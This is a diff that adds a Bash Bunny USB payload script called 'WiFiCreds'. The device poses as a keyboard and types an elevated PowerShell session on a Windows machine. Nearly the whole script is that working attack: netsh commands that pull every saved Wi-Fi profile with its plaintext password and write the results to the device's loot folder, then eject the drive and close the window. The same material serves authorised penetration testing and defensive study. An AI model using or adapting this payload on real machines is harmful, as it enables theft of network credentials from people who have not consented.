@@ -1,0 +1,62 @@
+#!/bin/bash
+#
+# Title:         WiFiCreds
+# Author:        illwill
+# Version:       0.3
+#
+# Dumps the stored plaintext Wifi SSID & passwords from Windows boxes using Powershell
+# then stashes them in /root/udisk/loot/WiFiCreds
+#
+# Blue...............Running Powershell HID Script
+# Purple.............Getting WiFi Creds
+# Green..............Got WiFi Creds
+# Red................Didn't Get WiFi Creds
+
+LED R 200
+mkdir -p /root/udisk/loot/WiFiCreds
+rm -f /root/udisk/loot/WiFiCreds/DONE
+
+ATTACKMODE HID STORAGE
+LED B 200
+Q GUI
+Q DELAY 500
+Q STRING POWERSHELL
+Q DELAY 1000
+Q CTRL-SHIFT ENTER
+Q DELAY 2000
+Q LEFTARROW
+Q DELAY 100
+Q ENTER
+Q DELAY 1200
+Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q ENTER
+Q DELAY 100
+LED R B 200 
+Q STRING \(netsh wlan show profiles\) \| Select-String \"\\:\(.+\)\$\" \| \%\{\$name\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| 
+Q STRING \%\{\(netsh wlan show profile name\=\""\$name\"" key\=clear\)\}  \| Select-String \""Key Content\\W+\\:(.+)\$\"" \|
+Q STRING \%\{\$pass\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| \%\{\[PSCustomObject\]@\{ "PROFILE_NAME"\=\$name\;PASSWORD\=\$pass \}\} \|
+Q STRING Format-Table -AutoSize \| Out-File \$Bunny\\loot\\WiFiCreds\\\$env:computername.txt
+Q ENTER
+Q DELAY 100
+Q STRING Out-File -FilePath \$BUNNY\\loot\\WifiCreds\\DONE
+Q ENTER
+Q DELAY 100
+
+# Eject the USB Safely 
+Q STRING \$Eject \=  New-Object -comObject Shell.Application
+Q ENTER
+Q DELAY 100
+Q STRING \$Eject.NameSpace\(17\).ParseName\(\$Bunny\).InvokeVerb\(\"Eject\"\)
+Q ENTER
+Q DELAY 100
+
+# GTFO
+Q STRING EXIT
+Q ENTER
+#Sync Drive
+sync
+
+FILE="/root/udisk/loot/WiFiCreds/DONE"
+while [ ! -e $FILE ]; do sleep 1; done;
+sleep 1;
+if [ -e $FILE ]; then rm -f $FILE; LED G 200; else LED R; fi
